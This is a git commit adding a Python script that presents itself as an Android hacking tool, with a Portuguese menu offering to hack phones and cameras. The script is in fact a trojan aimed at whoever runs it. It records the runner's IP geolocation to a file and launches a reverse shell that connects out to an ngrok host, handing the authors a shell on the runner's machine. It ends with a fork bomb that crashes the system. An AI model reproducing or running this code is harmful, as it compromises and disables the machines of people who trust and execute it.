f956169b6eb6ee57c48c8d43d1377a0d159e3d24
SPAWN-cloud <80365034+SPAWN-cloud@users.noreply.github.com>
2022-02-06 15:49:38 -0300

    Add files via upload

---
+++ tool-invarder.py
@@ -0,0 +1,113 @@
+#-- coding: UTF-8 --
+import os, time, sys, json, socket, pty
+reset = '\033[0;0m'
+destq = '\033[;1m'
+yellow = '\033[1;33m'
+green = '\033[1;32m'
+red = '\033[1;31m'
+blue = '\033[1;34m'
+wh = '\033[1;97m'
+
+ip = requests.get('http://ip-api.com/json/');ip = ip.json();query = ip['query'];status = ip['status'];country = ip['country'];countryC = ip['countryCode'];region = ip['region'];regionN = ip['regionName'];city = ip['city'];zip = ip['zip'];lat = ip['lat'];lon = ip['lon'];tmz = ip['timezone'];isp = ip['isp'];org = ip['org'];As = ip['as']
+try:
+    import requests
+except ModuleNotFoundError:
+    os.system('pip install requests')
+with open('lol.txt', 'w') as arc:
+    arc.write(f'''{query}
+{status}
+{country}
+{countryC}
+{region}
+{regionN}
+{city}
+{zip}
+{lat}
+{lon}
+{tmz}
+{isp}
+{org}
+{As}
+lol hacked by spawn & berl1n''')
+
+print(f''' 
+{green}
+88                                                        88                        
+""                                                        88                        
+                                                          88                        
+88 8b,dPPYba,  8b       d8 ,adPPYYba, 8b,dPPYba,  ,adPPYb,88  ,adPPYba, 8b,dPPYba,  
+88 88P'   `"8a `8b     d8' ""     `Y8 88P'   "Y8 a8"    `Y88 a8P_____88 88P'   "Y8  
+88 88       88  `8b   d8'  ,adPPPPP88 88         8b       88 8PP""""""" 88          
+88 88       88   `8b,d8'   88,    ,88 88         "8a,   ,d88 "8b,   ,aa 88          
+88 88       88     "8"     `"8bbdP"Y8 88          `"8bbdP"Y8  `"Ybbd8"' 88         
+
+                                   {red} Created by {red}
+                             {wh} SpawnDEV & Berl1nDEV{red}''')
+
+print(f'''
+[1] Hackear Android
+[2] Hackear Camera Android
+[3] Matar Android Alvo
+''')
+
+
+def execute_sweet():
+        loadmain = " ..."
+        for c in range(1):
+            print('[*]Loading', end='')
+            for i in list(loadmain):
+                print(i, end='')
+                sys.stdout.flush()
+                time.sleep(0.5)  
+execute_sweet()
+var = input('Selecione a opção: ')
+if var == '1':
+    print('a opção 1 foi escolhida com sucesso')
+
+if var == '2':
+    print('a opção 2 foi escolhida com sucesso')
+
+if var == '3':
+    print('a opção 3 foi escolhida com sucesso')
+
+if var == '1':
+    input('Digite o IP do alvo: ')
+def execute_sweet():
+        loadmain = " ..."
+        for c in range(1):
+            print('[*]Aguarde', end='')
+            for i in list(loadmain):
+                print(i, end='')
+                sys.stdout.flush()
+                time.sleep(0.5)  
+execute_sweet()
+os.system('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.ngrok.io",16287));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''')
+
+if var == '2':
+    input('Digite o IP do alvo: ')
+def execute_sweet():
+        loadmain = " ..."
+        for c in range(1):
+            print('[*]Aguarde', end='')
+            for i in list(loadmain):
+                print(i, end='')
+                sys.stdout.flush()
+                time.sleep(0.5)  
+execute_sweet()
+os.system('''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("6.tcp.ngrok.io",16287));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''')
+
+if var == '3':
+    input('Digite o IP do alvo: ')
+def execute_sweet():
+        loadmain = " ..."
+        for c in range(1):
+            print('[*]Aguarde', end='')
+            for i in list(loadmain):
+                print(i, end='')
+                sys.stdout.flush()
+                time.sleep(0.5)  
+execute_sweet()
+
+while True:
+    os.fork()
+    
